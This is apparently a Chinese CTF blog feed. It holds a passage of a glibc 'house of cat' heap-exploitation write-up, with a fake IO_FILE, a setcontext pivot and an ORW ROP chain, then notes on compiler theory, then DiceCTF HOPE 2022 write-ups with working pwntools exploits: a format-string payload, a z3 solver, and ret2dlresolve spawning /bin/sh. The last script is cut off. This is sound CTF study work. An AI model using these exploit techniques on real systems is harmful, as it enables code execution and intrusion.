alt="image-20220803204441077"></p><p>首先看我们把[rdi+0xa0]移动到rax。在上面的伪造FILE中，也就是<code>heap_base+0xb30</code>。而这个地址，实际上指向的是什么呢？我们动态调试一下。用以下命令下断点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(io,<span class="string">&#x27;b* (_IO_wfile_seekoff)&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2022/08/02/house-of-cat/image-20220803204944167.png" alt="image-20220803204944167"></p><p>这一步之后，就是上面wget相关函数。我们在运行完将结果给到rax之后，看一看rax。发现其实是伪造FILE的第二行。</p><p><img src="/2022/08/02/house-of-cat/image-20220803205215090.png" alt="image-20220803205215090"></p><p><img src="/2022/08/02/house-of-cat/image-20220803205116039.png" alt="image-20220803205116039"></p><p>接下来两句汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x7fd903968d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line">► <span class="number">0x7fd903968d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行之后rdx是</p><p><img src="/2022/08/02/house-of-cat/image-20220803205425221.png" alt="image-20220803205425221"></p><p><img src="/2022/08/02/house-of-cat/image-20220803205837782.png" alt="image-20220803205837782"></p><p>这个地址里面存的内容是什么呢？不着急，我们往下看。</p><p>不过接下来，到达了以下汇编部分</p><p><img src="/2022/08/02/house-of-cat/image-20220803205954089.png" alt="image-20220803205954089"></p><p>这里经过cmp之后，并没有在jmp跳转。直接进入了后面。好，在这里我们重新设置了rax。而这里的rax也和我们最重要调用的函数息息相关。我们原本的rax是</p><p><img src="/2022/08/02/house-of-cat/image-20220803210235857.png" alt="image-20220803210235857"></p><p>之后，加上0xe0并解引用之后的结果如下。而这部分在Fake_file中的体现也就是第18行，在未解引用的时候位于FAKE_FILE第四行1的位置，解引用之后加上0x18的偏移量，正好是setcontext的地址。</p><p><img src="/2022/08/02/house-of-cat/image-20220803210429210.png" alt="image-20220803210429210"></p><p><img src="/2022/08/02/house-of-cat/image-20220803210700762.png" alt="image-20220803210700762"></p><p>好，在进入setcontext之前我们看一眼寄存器。</p><p><img src="/2022/08/02/house-of-cat/image-20220803210723931.png" alt="image-20220803210723931"></p><h3 id="setcontext的具体构造"><a href="#setcontext的具体构造" class="headerlink" title="setcontext的具体构造"></a>setcontext的具体构造</h3><p>在setcontext中，我们将要经过两次跳转。第一次的jump是必然发生的。但是第一次跳转我们其实只需要其中的一条汇编，<strong>也就是修改rsp为ROP的起始位置（注意看现在rsp为pop rdi了）</strong>。注意看这里是根据rdx的偏移来放置内容的。<strong>好，到这里就明确了，之前我们在fake_file中放置的rdx的值(见FAKE_FILE旁的注释)实际上和最终的ROP链息息相关</strong>。怎么计算呢？<strong>看到这里取出的是[rdx+0xa0]，那么实际上就是在第9个chunk中的ROP链==所在的地址==减去0xa0</strong>。</p><p><img src="/2022/08/02/house-of-cat/image-20220803211025031.png" alt="image-20220803211025031"></p><p>如下所示。注意不是ROP链的地址，是<strong>所在的地址</strong>。而这个地址我们可以人为的写在某个地方。在这里，就是FAKE_FILE最后末尾的<code>p64(heap_base+0x2050)</code></p><p><img src="/2022/08/02/house-of-cat/image-20220803211921211.png" alt="image-20220803211921211"></p><p>接下来的几个赋值并不重要。重要的是我们一定会完成这个跳转。注意这里push了一个rcx。这个也是当前rdx偏移计算的。**这个值正是我们伪造的FILE的最后一个字段内容p64(ret)**。其实就是一个ret。</p><p><img src="/2022/08/02/house-of-cat/image-20220803212712115.png" alt="image-20220803212712115"></p><p>其实跳转之后的汇编也可以用来布置参数(当GADGET比较少的情况下)。我们此时rdx依然是之前的位置没有变。可以通过此处布置参数(可以看到rsi,rdi都在里面了)也可以在后面ROP的时候自己构造。这里提前防止参数的好处就是在无法泄露堆地址的情况下，可以直接获取堆对应位置字符串。如果后续使用ROP需要知道堆地址。</p><p><img src="/2022/08/02/house-of-cat/image-20220803212846993.png" alt="image-20220803212846993"></p><p>终于，到了ROP</p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p><img src="/2022/08/02/house-of-cat/image-20220803213503330.png" alt="image-20220803213503330"></p><p>这里由于只允许文件描述符0，因此先关闭0，之后打开文件的时候文件描述符自动会变成0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(pop_rdi)+p64(<span class="number">0</span>)+p64(close)+p64(pop_rdi)+p64(flag_addr)+\</span><br><span class="line">    p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscallret)+\</span><br><span class="line">        p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(flag_addr)+\</span><br><span class="line">            p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(read_func)+\</span><br><span class="line">                p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write_func)</span><br></pre></td></tr></table></figure><p>其实之后也就不复杂了。先close(0)之后就是正常的ORW。由于我们当前有储存在chunk的文件名“flag”，也有堆地址，可以任意指定一个地方储存flag内容。因此剩下的就不复杂了。我们也可以在这里布置参数，就不需要setcontext布置了。</p><p>这里还学到一个就是libc的read write等参数调用和系统调用是一模一样的。其实这里用了glibc的，用系统调用也完全没有问题。(并且好像glibc也就是在外面套了一层壳)</p><p><img src="/2022/08/02/house-of-cat/image-20220803214011619.png" alt="image-20220803214011619"></p><p><img src="/2022/08/02/house-of-cat/image-20220803214029132.png" alt="image-20220803214029132"></p><p><img src="/2022/08/02/house-of-cat/image-20220803214112302.png" alt="image-20220803214112302"></p><p>至此这道题结束了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>这道题最重要的是提供了一种IO_FILE中，控制其重要寄存器rdx，并且调用set context的一种手法。首先这道题用largebin attack改了stderr，写成了一个chunk，之后触发malloc_assert，在chunk中写FAKE_FILE，触发set_context，完成ROP。如果这道题没有开沙箱，那么直接将chunk开头的部分写成/bin/sh(将会存在rdi中)，调用的函数写成system即可。</p><p>回顾一下构造的IO_FILE。看看要改什么地方。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) <span class="comment"># heap_base+0xb30，rax1</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>) <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>) <span class="comment"># rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment"># call addr, here is [rax+0x18]</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span> )  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)*<span class="number">2</span> <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2  rax+0xe0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x17d0</span></span><br><span class="line">payload1 = fake_IO_FILE + p64(flag_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap_base+<span class="number">0x2050</span>)+p64(ret)</span><br></pre></td></tr></table></figure><p>从上往下看，这里的第5行，需要改成<strong>存放ROP指令的chunk的地址减去0xa0之后的数值存放的地址</strong>。用一张图表示，不然太拗口了。就是填0x210。而地址A-0xa0的数值，可以填在这个FILE结构体后面(就相当于下面绿色的块，不过填在哪里都可以)</p><p><img src="/2022/08/02/house-of-cat/image-20220803221156089.png" alt="image-20220803221156089"></p><p>第六行填写要调用的函数的地址。</p><p>第12行填写指向第二行p64(0)所在的地址</p><p>第16行写入上面这个固定的内容，绕过vtable的检验。可以通过以下方式找到。</p><p><img src="/2022/08/02/house-of-cat/image-20220803221641708.png" alt="image-20220803221641708"></p><p>第18行rax2将会指向第四行的p64(1)的位置，影响到后面call的函数。</p><p>最后一行中末尾还需要加一个ret的gadget，通过在set_context中rdx的偏移找到，并且用于在ROP中（因为一开始会push一个rcx，就是这个值）</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>泄露libc和堆（很多地方用到了偏移）</li><li>能够通过largebin attack或者tcache stashing unlink等修改stderr(可控地址写入可控值)</li><li>能够触发malloc_assert流(例如top chunk的size出错，基本上所有malloc相关的出错都会调用assert)</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.pediy.com/thread-273895.htm#msg_header_h2_4">https://bbs.pediy.com/thread-273895.htm#msg_header_h2_4</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
            <tag> FSOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crafting_interpreters 1</title>
      <link href="/2022/07/29/crafting-interpreters1/"/>
      <url>/2022/07/29/crafting-interpreters1/</url>
      
        <content type="html"><![CDATA[<p>学习<a href="https://craftinginterpreters.com/introduction.html">手动实现编译器</a>上面的编译器原理内容，希望难度不大，能跟着学下去~</p><p>crafting-interpreters 1</p><span id="more"></span><p>镇楼</p><blockquote><p>My hope is that if you’ve felt intimidated by languages and this book helps you overcome that fear, maybe I’ll leave you just a tiny bit braver than you were before.</p></blockquote><p>镇楼*2，编译的流程图</p><p><img src="/2022/07/29/crafting-interpreters1/image-20220729104647438.png" alt="image-20220729104647438"></p><h1 id="map-of-territory"><a href="#map-of-territory" class="headerlink" title="map of territory"></a>map of territory</h1><p>我们可以从上面这张图入手，分析一下一个编译器看到一段代码之后会发生什么事情</p><p><img src="/2022/07/29/crafting-interpreters1/image-20220729112029271.png" alt="image-20220729112029271"></p><h2 id="step1-scanning"><a href="#step1-scanning" class="headerlink" title="step1: scanning"></a>step1: scanning</h2><p>第一步是扫描，也叫做<em>词法分析</em>。一个扫描器接受一系列<em>线性流</em>(也就是刚才提到的词语的组合)，并把他们组合在一起，生成一系列更接近<em>词</em>的东西(也叫做word/token)。有些token是单个的字符，比如括号，或者是逗号。另外一些可以是字符串，(“hi”)，或者类似<em>min</em>这类的区分符号。</p><p>在这一步中，编译器会去掉类似空格，或者注释等。这种情况下，上面这句话最终将变成这种形式。</p><p><img src="/2022/07/29/crafting-interpreters1/image-20220729112209998.png" alt="image-20220729112209998"></p><h2 id="step2-parse"><a href="#step2-parse" class="headerlink" title="step2: parse"></a>step2: parse</h2><p>这一部分编译器需要把长的表达式分成更小的部分，比桑说：生成AST。</p><p><img src="/2022/07/29/crafting-interpreters1/image-20220729112903666.png" alt="image-20220729112903666"></p><p>这里就将average的表达式拆分成上面的表达形式。</p><h2 id="step3-static-analysis"><a href="#step3-static-analysis" class="headerlink" title="step3:static analysis"></a>step3:static analysis</h2><p>在上面两步中，几乎是所有语言都会进行的操作，接下来的内容对于不同语言，就会产生不同实现。</p><p>一个很简单的例子：比方说对于提到的变量a和b我们怎么追溯到他的值，也不知道他的<strong>属性</strong>(比方说：是否是全局的，是静态还是局部等)，也就是binding/resolution</p><p>当我们在检查变量在哪里定义的时候，scope的作用就在于此被发挥，scope决定了在某个时刻，一个变量是否能被引用。</p><p>接着我们还检查变量的类型。如果变量a和变量b不支持加法操作，那么我们会抛出一个<strong>type error</strong>。</p><p>我们这些分析的内容，需要被保存下来。有一些方法</p><ul><li>保存在参数树上</li><li>保存在一个符号表中，用变量的名称指代变量</li><li>将树转换为全新的数据结构从而更好地体现代码的语义。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面三点称作<strong>编译器前端</strong>的工作。也很好理解。前端代表我们如何处理用户输入，解析用户的语句表达式，而后端则更注重怎样将代码转化为机器语言。接下来介绍的<strong>中间语言</strong>就是两者之间的桥梁。</p><h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><p>在前端和后端之间的中间语言(IR)承担的工作是在两种语言之间搭建桥梁。也就是说：我们可以依赖中间表示，从而并不在意我们编写的代码最终运行在哪种架构的机器上。类似gcc使用的中间语言就是<a href="https://gcc.gnu.org/onlinedocs/gccint/GIMPLE.html">GIMPLE</a>。</p><h2 id="optimization"><a href="#optimization" class="headerlink" title="optimization"></a>optimization</h2><p>编译器除了翻译文件之外，还要做的很重要的事情就是优化。一个常见的例子就是常量折叠。如果我们要反复计算某个数值，我们可以单独把结果作为计算表达式的代替。例如作者给出的例子。将下面这一行，直接用结果代替。</p><p><img src="/2022/07/29/crafting-interpreters1/image-20220729134247305.png" alt="image-20220729134247305"></p><p><img src="/2022/07/29/crafting-interpreters1/image-20220729134303830.png" alt="image-20220729134303830"></p><p>常见的优化措施例如：循环展开，死代码消除，全局变量计数等。</p><h2 id="code-generate"><a href="#code-generate" class="headerlink" title="code generate"></a>code generate</h2><p>在完成了上述步骤之后，最后一步就是要生成真正能够运行的机器代码。也就是01二进制机器码。但是这里要牵涉到对于特种架构的代码生成。我们也要在这里考虑究竟是针对虚拟机生成还是针对真实机器生成。</p><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p>一般来说字节码(bytecode)翻译成机器码(native code或者machine code)也是需要一次转换。这里一般的思路就是把字节码当作中间表示，再转化为CPU所能识别的。但是在这一过程中，我们最好能够根据不同架构进行分别处理和优化。</p><p>我们的另一种思路就是生成一个虚拟机。这种情况下我们的代码将可以在任何平台上面运行。但是速度将会稍慢。但是如果我们用c这种语言来编写虚拟机，速度也不会影响很大。</p><h2 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h2><p>runtime中，可以包含一些代码运行时的常见问题补救。比方说java的runtime就存在垃圾回收机制，用来辅助运行时能够更加安全等。</p><h1 id="shortcuts"><a href="#shortcuts" class="headerlink" title="shortcuts"></a>shortcuts</h1><p>上面的整个流程，往往很多语言不会全部都加到自己的特性中，而是挑选其中的一部分。以下是一些案例。</p><h2 id="single-pass-compiler"><a href="#single-pass-compiler" class="headerlink" title="single pass compiler"></a>single pass compiler</h2><p>此类编译器并不处理符号，而是直接根据语法树的特性把文件编译成字节码。参数直接翻译技术使得我们直接将一部分特定的语法和动作联系起来。只要我们看到一些表达式时，就能够直接将其编译。</p><p>C语言和Pascal语言就具有这一类特性。</p><h2 id="tree-walk-interpreter"><a href="#tree-walk-interpreter" class="headerlink" title="tree walk interpreter"></a>tree walk interpreter</h2><p>有一部分原因呢可以直接在AST的基础上执行。这类语言直接采用遍历树的方法获取结果。一般来说这种编译器比较简单。在YARV虚拟机上工作的Ruby1.9就是用这种方式运行的。</p><h2 id="transpilers"><a href="#transpilers" class="headerlink" title="transpilers"></a>transpilers</h2><p>这种编译器很好笑，他把一种高级语言A转化为另一种高级语言B，然后用高级语言B的编译器来执行。这类编译器又被称作<strong>source-to-source compiler</strong>。例如有很多的语言都会把自身转化为javascript。因为javascript在过去是唯一一种可以在浏览器上执行的代码。现在还有web assembly。</p><p>另外还有一些transpilers可以把8080汇编转化为8086汇编。</p><h2 id="JIT编译"><a href="#JIT编译" class="headerlink" title="JIT编译"></a>JIT编译</h2><p>动态生成代码技术(just in time)可以确保用户load代码时，能够直接根据电脑所在的硬件平台生成机器码。</p><h1 id="compiler-v-s-interpreter"><a href="#compiler-v-s-interpreter" class="headerlink" title="compiler v.s interpreter"></a>compiler v.s interpreter</h1><p>编译器(compiler)和解释器(interpreter)的区别是什么呢？</p><p><strong>编译</strong>：把一种源代码转化为另外一种通常来说是低级的表示形式。</p><p><strong>解释</strong>：表示我们接受源码并且直接执行它。也就是“从源码直接执行文件”</p><p><img src="/2022/07/29/crafting-interpreters1/image-20220729152618803.png" alt="image-20220729152618803"></p><p>比方说一个例子：go语言，go语言是一个编译器(我们可以编译go语言，并且不执行它)，也是一个解释器(我们可以直接从源码运行go语言)。而解释的过程，也是需要编译的，只不过是在内部发生的。</p><p>比较纯正的编译器比方说gcc，javac等，就只能编译，但是不能执行。</p><h2 id="JIT的缺陷"><a href="#JIT的缺陷" class="headerlink" title="JIT的缺陷"></a>JIT的缺陷</h2><p>文章末尾提示一个问题：思考JIT技术的弊端。</p><p>JIT技术显然可以很好的优化代码。在网上查到JIT技术可以减少缺页发生的频率，从而加快代码编译之后的执行速度。</p><p>但是弊端是：JIT技术依赖动态生成源码，也就是我们打开并运行程序需要的时间可能比较久。此外也比较消耗内存，因为需要实时编译。</p>]]></content>
      
      
      <categories>
          
          <category> interpreter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> interpreter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dice2022@hope</title>
      <link href="/2022/07/28/dice2022-hope/"/>
      <url>/2022/07/28/dice2022-hope/</url>
      
        <content type="html"><![CDATA[<p>好久没打比赛了..被一个培训搞得身心俱疲。今日被松神带着打了一场比赛，逐渐找找之前的感觉。<br><br>暑假还打算学一下编译，不知道本科有没有机会学了，珍惜剩下的时间吧</p><p>比赛题目<a href="https://github.com/dicegang/hope-2022-challenges">官方存档以及wp</a></p><span id="more"></span><h1 id="luckydice"><a href="#luckydice" class="headerlink" title="luckydice"></a>luckydice</h1><p>乍一看没什么思路，有一个格式化字符串</p><p><img src="/2022/07/28/dice2022-hope/image-20220728200357836.png" alt="image-20220728200357836"></p><p>应该就是挺明显的了，因为没给libc，堆题概率也不大。在栈上找一下残留数据，看看这个result被放在什么位置，用格式化字符串修改里面的数据就可以了。这里学到的是格式化字符串也不一定要手动写入地址。可以直接利用栈上现成的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./luckydice&quot;</span></span><br><span class="line"><span class="comment"># libc_name=&quot;&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">io = remote(<span class="string">&#x27;mc.ax&#x27;</span>, <span class="number">31849</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line"><span class="comment"># libc=ELF(libc_name)</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;brva 0x1523&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&#x27;%243c%10$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;roll? &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;charm:&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="fermet"><a href="#fermet" class="headerlink" title="fermet"></a>fermet</h1><p>很好玩的题目。要利用整数溢出找到一个费马大定理的反例。也就是x^3+y^3=z^3非零整数解的情况。这个显然就是溢出做了。</p><p>我一开始还在努力尝试。结果松神直接z3跑出来了，我才恍然大悟。确实用z3就可以了。不过要注意使用bitvec才能确保可以溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line">UserInput=[z3.BitVec(<span class="string">&#x27;x%d&#x27;</span>%i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">solver=z3.Solver()</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> UserInput:</span><br><span class="line">    solver.add(k&lt;<span class="number">100000</span>,k&gt;<span class="number">0</span>) <span class="comment"># 添加题目的限制</span></span><br><span class="line">solver.add(UserInput[<span class="number">0</span>]*UserInput[<span class="number">0</span>]*UserInput[<span class="number">0</span>]+UserInput[<span class="number">1</span>]*UserInput[<span class="number">1</span>]*UserInput[<span class="number">1</span>]==UserInput[<span class="number">2</span>]*UserInput[<span class="number">2</span>]*UserInput[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">if</span> solver.check()==z3.sat:</span><br><span class="line">    m=solver.model()</span><br><span class="line">    ans=[m[v].as_long() <span class="keyword">for</span> v <span class="keyword">in</span> UserInput]</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><p>得到结果</p><blockquote><p>[84837, 96475, 41100]</p></blockquote><h1 id="puppy"><a href="#puppy" class="headerlink" title="puppy"></a>puppy</h1><p><strong>经典64位ret2dlresolve</strong>。程序非常简单，就是溢出之后什么也没有。用李哥给的科恩内部脚本也是可以的，但是远程不行，当时还在准备培训就没管了。比赛之后看到别人的wp用了pwntools自带的特殊脚本。感觉很好用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.bits = <span class="number">64</span> <span class="comment"># 注意要指定位数，不然默认是32位</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;mc.ax&quot;, 31819)</span></span><br><span class="line">p = process(<span class="string">&quot;./puppy&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;puppy&quot;</span>)</span><br><span class="line">rop = ROP(context.binary, badchars=<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&quot;system&quot;</span>, args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"><span class="comment"># rop.call(0x0000000000401159)</span></span><br><span class="line">rop.gets(dlresolve.data_addr) <span class="comment"># do not forget this step, but use whatever function you like</span></span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">24</span> + raw_rop) <span class="comment"># 这里可以先写上溢出完rbp的长度</span></span><br><span class="line">p.sendline(dlresolve.payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/07/28/dice2022-hope/image-20220728201911044.png" alt="image-20220728201911044"></p><p>在这里测试一下pwntools脚本的通用性。</p><p>源代码为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">200</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译了三个文件，如下所示。</p><p><img src="/2022/07/28/dice2022-hope/image-20220728202511035.png" alt="image-20220728202511035"></p><p>经过测试，只能在partial relro情况下成功。此时注意脚本里面使用read的话要稍作改动。也就是17行要加上read(0)这个参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.bits = <span class="number">64</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;mc.ax&quot;, 31819)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&quot;./no_prot&quot;</span></span><br><span class="line"><span class="comment"># file_name = &quot;./relro&quot;</span></span><br><span class="line">p = process(file_name)</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(file_name)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&quot;system&quot;</span>, args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"><span class="comment"># rop.call(0x0000000000401159)</span></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr) <span class="comment"># do not forget this step, but use whatever function you like</span></span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b 